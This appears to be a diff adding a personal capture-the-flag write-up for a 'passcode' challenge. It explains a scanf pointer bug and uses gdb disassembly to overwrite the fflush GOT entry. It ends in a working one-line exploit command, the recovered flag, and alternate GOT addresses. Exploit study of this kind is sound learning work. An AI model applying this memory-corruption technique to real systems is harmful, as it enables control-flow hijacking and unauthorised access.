@@ -1,0 +1,47 @@
+#NEEDED HELP IN UNDERSTANDING THE LINK BETWEEN THE STACK ARGS OF WELCOME (NAME) AND THE STACK ARGS OF LOGIN(PASSCODE1, PASSCODE2 WHICH IS NOT IMPROTANT)
+
+welcome() inserts the given buffer (can be 100 bytes long) into ebp-0x70 (ebp-0x70 -> ebp-0x6)
+disas of login() shows that initial value of passcode1 is from ebp-0x10
+compiler error shows that instead of int* it was given an int, so:
+when uusing scanf on passcode1, it will write the value not into passcode1, but in the initial value of passcode1 interperted as an address
+
+1: ebp-0x70 -> ebp-0x10 - ignored data, not used (0x60 = 96 bytes that are unused, padding)
+2: ebp-0x10 -> ebp-0xc - initial value that will be given to passcode1 in login() and will be used as an address in the first scanf() in login()
+3: ebp-0xc -> ebp-0x8 - will not be caught in welcome but will be the inputed value of the actual scanf() function
+
+what will happen:
+scanf(3 -> 2), value inputed in the first scanf() will be written into the address specified in the last 4 bytes of the "name" buffer
+
+because fflush() was straight after scanf(), i went to change the GOT address of the actual fflush address to the address
+that does the system("/bin/cat flag") in the end of login
+
+1. got the address of the GOT address of fflush() by disassemblying login(), fflush's specified address is seen to be fflush@plt, which 
+is the PLT entry of fflush(), and while running the program it will change the jump to address in the start of the PLT entry to the
+address of the GOT entry that will contain the runtime actual address of the actual fflush() instructions:
+(gdb) x/3i 0x8048430
+   0x8048430 <fflush@plt>:      jmp    *0x804a004  # 0x804a004 is the runtime address of the GOT entry of fflush()
+   0x8048436 <fflush@plt+6>:    push   $0x8
+   0x804843b <fflush@plt+11>:   jmp    0x8048410
+# for compatibility reasons - the address needs to be little endian, so the value that is actually used is \x04\xa0\x04\x08
+
+2. for the address of the system("/bin/cat flag"), i just disassembled login() and moved to the last page:
+---Type <return> to continue, or q <return> to quit---
+   0x080485cc <+104>:   jne    0x80485f1 <login+141>
+   0x080485ce <+106>:   cmpl   $0xcc07c9,-0xc(%ebp)
+   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
+   0x080485d7 <+115>:   movl   $0x80487a5,(%esp)
+   0x080485de <+122>:   call   0x8048450 <puts@plt>
+   0x080485e3 <+127>:   movl   $0x80487af,(%esp)  # command being provided to system, need to also perform this to pass a command to system
+   0x080485ea <+134>:   call   0x8048460 <system@plt>  # address of the actual command in login() i want to perform instead
+   0x080485ef <+139>:   leave  
+   0x080485f0 <+140>:   ret   
+address used - 0x080485e3 (after some tempering i found out that the regular address needs to be used, not the little endian encoded one)
+as scanf(%d, ..) expects an integer input i cant use the hexadecimal string value of the address, but the decimal value of the address (134514147)
+
+final command -> python -c "print '\x58' * 96 + '\x04\xa0\x04\x08' + '134514147'" | ./passcode
+flag: "Sorry mom.. I got confused about scanf usage :("
+
+# can actually write into the GOT entry address of any other function between the IF and the first scanf() but change the addresses:
+fflush() - \x04\xa0\x04\x08
+printf() - \x00\xa0\x04\x08
+0x804a020 , 0x804a00c 
